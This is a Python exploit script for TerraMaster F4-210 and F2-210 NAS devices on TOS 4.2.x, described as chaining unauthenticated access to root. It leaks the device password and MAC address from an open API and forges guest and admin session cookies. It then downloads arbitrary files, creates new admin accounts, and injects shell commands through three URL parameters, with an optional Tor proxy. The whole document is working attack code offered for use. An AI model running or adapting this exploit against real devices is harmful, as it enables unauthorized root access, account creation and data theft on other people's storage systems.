"""
Product: Terramaster F4-210, Terramaster F2-210
Version: TOS 4.2.X (4.2.15-2107141517)
Author: n0tme (thatsn0tmysite)
Description: Chain from unauthenticated to root via session crafting.
"""

import urllib3
import requests
import json
import argparse
import hashlib
import time
import os

TARGET = None
MAC_ADDRESS = None
PWD = None
TIMESTAMP = None
urllib3.disable_warnings()

def tos_encrypt_str(toencrypt):
    key = MAC_ADDRESS[6:]
    return hashlib.md5(f"{key}{toencrypt}".encode("utf8")).hexdigest()

def user_session(session, username):
    session.cookies.clear()
    cookies = {"kod_name":username, "kod_token":tos_encrypt_str(PWD)}
    if username == "guest":
        cookies = {"kod_name":"guest", "kod_token":tos_encrypt_str("")}

    for name,value in cookies.items():
        session.cookies[name] = value

def download(session, path, save_as=None):
    user_session(session, "guest")
    r=session.post(f"{TARGET}/module/api.php?mobile/fileDownload", data={"path":path})
    filename = os.path.basename(path)
    if save_as is not None:
        filename = save_as
    with open(filename, "wb") as file:
        file.write(r.content)

def get_admin_users(session):
    download(session, "/etc/group", save_as="./terramaster_group1")
    with open("./terramaster_group1", "r") as groups:
        for line in groups:
            line = line.strip()
            fields = line.split(':')
            if fields[0] == "admin":
                users = fields[3].split(",")
                groups.close()
                os.remove("./terramaster_group1")
                return users

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument(dest="target", help="Target URL (e.g. http://10.0.0.100:8181)")
    p.add_argument("--cmd", dest="cmd", help="Command to run", default="id")
    p.add_argument("-d", "--download", dest="download", help="Only download file", default=None)
    p.add_argument("-o", "--output", dest="save_as", help="Save downloaded file as", default=None)
    p.add_argument("-c", "--create", dest="create", help="Only create admin user (format should be admin:password)", default=None)
    p.add_argument("--tor", dest="tor", default=False, action="store_true", help="Use TOR")
    p.add_argument("--rce", dest="rce", default=0, type=int, help="RCE to use (1 and 2 have no output)")
    args = p.parse_args()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    TARGET = args.target

    s = requests.Session()
    if args.tor:
        s.proxies = {"http":"socks5://127.0.0.1:7890", "https": "socks5://127.0.0.1:7890"}
    s.headers.update({"user-device":"TNAS", "user-agent":"TNAS"})

    r=s.post(f"{TARGET}/module/api.php?mobile/wapNasIPS",verify=False)
    try:
        j = r.json()
        PWD = j["data"]["PWD"]
        MAC_ADDRESS = j["data"]["ADDR"]
    except KeyError:
        exit(1)

    TIMESTAMP = str(int(time.time()))
    s.headers.update({"signature": tos_encrypt_str(TIMESTAMP), "timestamp": TIMESTAMP})
    s.headers.update({"authorization": PWD})

    if args.download != None:
        download(s, args.download, save_as=args.save_as)
        exit(0)

    #RCEs
    RCEs=[f"{TARGET}/tos/index.php?app/del&id=0&name=;{args.cmd};xx%23",
          f"{TARGET}/tos/index.php?app/hand_app&name=;{args.cmd};xx.tpk", #BLIND
          f"{TARGET}/tos/index.php?app/app_start_stop&id=ups&start=0&name=donotcare.*.oexe;{args.cmd};xx"] #BLIND

    for admin in get_admin_users(s):
        user_session(s, admin)
        if args.create != None:
            user, password = args.create.split(":")
            groups = json.dumps(["allusers", "admin"])
            r=s.post(f"{TARGET}/module/api.php?mobile/__construct")
            r=s.post(f"{TARGET}/module/api.php?mobile/set_user_information", data={"groups":groups, "username":user,"operation":"0","password":password,"capacity":""})
            if "create user successful!" in str(r.content, "utf8"):
                print(r.content)
                break
            continue

        r = s.get(RCEs[args.rce])
        content = str(r.content, "utf-8")
        if "<!--user login-->" not in content:
            print(content)
    exit(0)
